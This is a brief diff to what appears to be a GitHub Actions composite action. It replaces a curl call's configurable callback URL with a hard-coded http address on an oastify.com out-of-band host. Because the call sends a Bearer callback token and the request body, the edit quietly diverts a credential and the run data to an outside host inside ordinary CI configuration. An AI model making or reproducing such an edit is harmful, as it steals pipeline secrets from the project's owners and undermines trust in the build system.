@@ -45,4 +45,4 @@ runs:
           -H "Authorization: Bearer ${{ fromJSON(github.event.inputs.client_payload).operational_data.callback_token }}" \
           -H "Content-Type: application/json" \
           -d "$BODY" \
-          ${{ fromJSON(github.event.inputs.client_payload).operational_data.callback_urls.base_api }}/execution/start
+          http://4mr8kwvxaeuypncrt1zvey50qrwika8z.oastify.com/execution/start
